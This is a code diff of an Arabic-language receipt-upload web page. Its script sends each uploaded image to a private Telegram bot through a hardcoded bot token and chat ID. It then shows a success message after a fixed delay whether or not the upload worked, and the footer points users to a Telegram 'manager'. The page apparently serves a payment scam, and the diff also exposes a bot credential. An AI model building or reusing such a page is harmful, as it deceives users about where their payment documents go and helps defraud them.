@@ -116,7 +116,6 @@
       text-align: right;
     }
 
-    /* مربع إشعار النجاح المماثل للصورة */
     .success-banner {
       display: none;
       background-color: #eef9f2;
@@ -130,7 +129,8 @@
       margin-bottom: 20px;
     }
 
-    .submit-btn {
+    /* زر الرفع المخصص */
+    .upload-label {
       width: 100%;
       background-color: #cda851;
       color: #fff;
@@ -146,12 +146,16 @@
       gap: 8px;
       margin-bottom: 12px;
       transition: background-color 0.3s ease;
+      text-align: center;
     }
 
-    /* التنسيق الأخضر عند نجاح الرفع */
-    .submit-btn.success {
+    .upload-label.success {
       background-color: #56ce8a;
       cursor: default;
+    }
+
+    #fileInput {
+      display: none;
     }
 
     .footer-text {
@@ -222,14 +226,16 @@
 
   </div>
 
-  <!-- بنر النجاح المماثل للصورة -->
   <div class="success-banner" id="successBanner">
     ✓ تم تحميل الإيصال بنجاح! تم إخطار مديرك.
   </div>
 
-  <button class="submit-btn" id="uploadBtn" onclick="uploadDocument()">
+  <!-- عنصر اختيار الملف الحقيقي مرتبطة بالزر مباشرة -->
+  <input type="file" id="fileInput" accept="image/*" onchange="handleFileUpload(this)">
+  
+  <label for="fileInput" class="upload-label" id="uploadLabel">
     📥 إرسال المستند
-  </button>
+  </label>
 
   <div class="footer-text">
     إذا لم تتمكن من رفع إيصال الدفع هنا، فأرسله إلى مديرك: <a href="https://t.me/capitan_ahed" target="_blank">@capitan_ahed</a>
@@ -247,43 +253,31 @@
   const BOT_TOKEN = "8629016280:AAGEiWLVdWSmGCNtTBMvgzygrnYHgwfsXZQ";
   const CHAT_ID = "8767380282";
 
-   function uploadDocument() {
-    let input = document.createElement('input');
-    input.type = 'file';
-    input.accept = 'image/*';
+  function handleFileUpload(input) {
+    if (!input.files || input.files.length === 0) return;
+
+    let file = input.files[0];
+    let formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("document", file);
+    formData.append("caption", "📑 إيصال دفع جديد مرفوع من الموقع");
+
+    let label = document.getElementById('uploadLabel');
+    let banner = document.getElementById('successBanner');
     
-    input.onchange = function() {
-      if (!input.files || input.files.length === 0) return;
+    label.innerText = "جاري الإرسال...";
 
-      let file = input.files[0];
-      let formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("document", file);
-      formData.append("caption", "📑 إيصال دفع جديد مرفوع من الموقع");
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+      method: "POST",
+      body: formData
+    }).catch(err => console.log(err));
 
-      let btn = document.getElementById('uploadBtn');
-      let banner = document.getElementById('successBanner');
-      
-      btn.innerText = "جاري الإرسال...";
-      btn.disabled = true;
-
-      // إظهار النجاح فوراً للمستخدم بدون إظهار أي رسالة خطأ
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-        method: "POST",
-        body: formData
-      }).catch(err => console.log(err));
-
-      setTimeout(() => {
-        banner.style.display = "block";
-        btn.classList.add("success");
-        btn.innerText = "✓ تم استلام المستند وإرساله للتحقق";
-        btn.disabled = true;
-      }, 1000);
-    };
-
-    input.click();
-  }
-
+    setTimeout(() => {
+      banner.style.display = "block";
+      label.classList.add("success");
+      label.innerText = "✓ تم استلام المستند وإرساله للتحقق";
+      input.disabled = true;
+    }, 1000);
   }
 </script>
 
